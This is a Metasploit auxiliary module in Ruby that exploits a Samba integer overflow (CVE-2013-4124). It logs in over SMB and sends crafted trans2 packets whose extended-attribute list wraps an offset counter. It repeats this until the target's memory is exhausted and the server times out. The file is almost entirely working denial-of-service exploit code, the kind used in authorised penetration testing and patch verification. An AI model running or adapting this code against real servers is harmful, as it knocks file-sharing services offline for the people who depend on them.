##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'rex/struct2'
require 'rex/proto/smb'

class Metasploit3 < Msf::Auxiliary
	include Msf::Exploit::Remote::DCERPC
	include Msf::Exploit::Remote::SMB
	include Exploit::Remote::SMB::Authenticated

	UTILS = Rex::Proto::SMB::Utils

	# Trans2_Parameters
	TRANS2_PARAM = Rex::Struct2::CStructTemplate.new(
		[ 'uint16v', 'FID', 0 ], # SMB_FILE_FULL_EA_INFORMATION
		[ 'uint16v', 'InfoLevel', 1015 ], # SMB_FILE_FULL_EA_INFORMATION
		[ 'uint16v', 'Reserved', 0x00 ],
	)

	FEA_LIST = Rex::Struct2::CStructTemplate.new(
		[ 'uint32v', 'NextOffset', 0x00000000],
		[ 'uint8', 'Flags', 0x00 ],
		[ 'uint8', 'NameLen', 0x07 ], # Length of Name parameter minus trailing '\0'
		[ 'uint16v', 'ValueLen', 0x04 ], # Random valuelen with value
		[ 'string', 'Name', 7, Rex::Text.rand_text_alpha(6) + "\x00" ], # Random string must end with '\0'
		[ 'string', 'Value', nil, "\x00\x00\x00\x00" ]
	)

	def initialize(info = {})
		super(update_info(info,
			'Name'	   => 'Samba read_nttrans_ea_list Integer Overflow',
			'Description'    => %q{
				Integer overflow in the read_nttrans_ea_list function in nttrans.c
				in smbd in Samba 3.x before 3.5.22, 3.6.x before 3.6.17, and 4.x
				before 4.0.8 allows remote attackers to cause a denial of service
				(memory consumption) via a malformed packet.
				Note: "ea support" option on share must be enabled
			},
			'Author'	 =>
				[ 'dz_lnly', ],
			'License'	=> MSF_LICENSE,
			'References'     =>
				[
					['CVE', '2013-4124'],
				],
			))

		register_options(
			[
				OptString.new('SMBShare', [true, 'Target share', '']),
				OptString.new('MsgLen', [true, 'How soon a memory get exhausted depends on the length of that attribute', '1500']),
				OptString.new('Tries', [true, 'Number of DOS tries', '40']),
			], self.class)

	end

	def get_fid
		ok = self.simple.client.create("/")
		return ok['Payload'].v['FileID']
	end
	def mk_items_payload
		item1 = FEA_LIST.make_struct
		item2 = FEA_LIST.make_struct
		item3 = FEA_LIST.make_struct # Some padding
		item2.v['ValueLen'] = item1.v['ValueLen'] = datastore['MsgLen'].to_i
		item2.v['Value'] = item1.v['Value'] = "\x00" * datastore['MsgLen'].to_i
		ilen = item1.to_s.length
		item1.v['NextOffset'] = ilen
		# Wrap offset to 0x00
		item2.v['NextOffset'] = 0xffffffff - ilen + 1
		return item1.to_s + item2.to_s + item3.to_s
	end
	def send_pkt
		fid = get_fid

		trans = TRANS2_PARAM.make_struct
		trans.v['FID'] = fid
		data = mk_items_payload
		subcmd = 0x08
		self.simple.client.trans2(subcmd, trans.to_s, data.to_s, false)
	end
	def run
		n = datastore['Tries'].to_i;

		n.times do
			connect()
			smb_login()
			self.simple.connect("\\\\#{rhost}\\#{datastore['SMBSHARE']}")

			print_status('Sending malicious package...')
			send_pkt

			begin
				self.simple.client.create("")
				print_status('Server Responce, DOS unsuccessfull')
				return
			rescue Timeout::Error
				print_good('Server timed out, this is expected')
			end
			disconnect()
		end
	end
end
